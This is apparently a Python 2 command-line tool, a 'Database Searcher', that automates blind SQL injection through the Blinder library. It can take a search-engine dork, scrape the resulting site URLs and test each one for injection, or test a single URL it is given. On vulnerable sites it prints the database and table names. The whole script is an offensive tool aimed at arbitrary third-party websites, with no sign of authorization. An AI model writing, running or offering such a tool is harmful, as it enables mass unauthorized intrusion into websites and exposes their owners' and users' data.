#Copyright 2020 By Fajar Firdaus

import Blinder
from time import sleep
from colorama import *
import urllib3 as ul 
from bs4 import BeautifulSoup as bs

def banner():
      print(Fore.GREEN + " __H__")
      print(Fore.GREEN + "  [']   " + Fore.YELLOW + " {Database Searcher}")
      print(Fore.GREEN + "  [)]   " + Fore.YELLOW + "      {V1.0}")
      print(Fore.GREEN + "  [']")
      print(Fore.GREEN + "   V")
      print("")
      print(Fore.YELLOW + '{')
      print(Fore.RED + 'Coder : Fajar Firdaus')
      print(Fore.RED + 'FB : Fajar Firdaus')
      print(Fore.RED + 'IG : FajarTheGGman')
      print(Fore.RED + "GITHUB : FajarTheGGman'")
      print(Fore.RED + '}')



def dorking():
    init = ul.PoolManager()

    url = str(raw_input("[?] Input Dork >_ "))
    req = init.request("GET", "https://www1.search-results.com/web?q=" + str(url)) 

    parse = bs(req.data, features="html.parser")

    for hasil in parse.find_all("cite"):
        injek = Blinder.blinder(
                str(hasil),
                sleep=1
            )

        if injek.check_injection() == True:
            print("[+] Target Vuln")
            print("[!] Searching The Databases")
            sleep(3)
            print("Database : %s " % injek.get_database())
            print("[!] Searching The Tables")
            tabel = injek.get_tables()
            for x in tabel:
                print("The Tables is : %s " % tabel)
        else:
            print("[!] Target Not Vulnerable")




def target():
    url = str(raw_input("[?] Input Website >_ "))

    injek = Blinder.blinder(
            url,
            sleep=1
        )

    if injek.check_injection() == True:
        print("[+] Target Vuln")
        print("[!] Searching The Databases")
        sleep(3)
        print("Database : %s " % injek.get_database())
        print("[!] Searching The Tables")
        tabel = injek.get_tables()
        for x in tabel:
            print("The Tables is : %s " % tabel)
    else:
        print("[!] Target Not Vulnerable")


banner()
while(True):
    menu = str(raw_input(Fore.YELLOW + "[?] Sql >_ "))
    if menu == "help":
        print(Fore.GREEN + "[ Here's The Commands ]")
        print(Fore.GREEN + "[ help ] For Help Commands")
        print(Fore.GREEN + "[ dork ] For sql injection with dorking")
        print(Fore.GREEN + "[ target ] For sql with target")
        print(Fore.GREEN + "[ exit ] For exit ")
    elif menu == "dork":
        dorking()
    elif menu == "target":
        target()
    elif menu == "exit":
        print("[!] Exiting")
        exit()
    else:
        print("[!] Wrong Commands")
